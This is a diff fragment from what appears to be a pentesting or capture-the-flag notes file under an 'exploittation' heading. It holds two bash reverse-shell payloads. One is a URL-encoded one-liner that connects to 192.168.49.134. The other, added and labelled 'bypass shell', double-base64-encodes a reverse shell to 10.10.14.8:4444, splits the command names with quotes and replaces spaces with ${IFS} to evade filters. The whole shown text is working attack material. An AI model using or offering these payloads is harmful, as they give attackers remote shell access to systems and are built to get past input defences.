@@ -2,6 +2,7 @@
 
 ``` 
  bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.134/80+0>%261'
+bypass shell:  echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 
 ```
 # exploittation
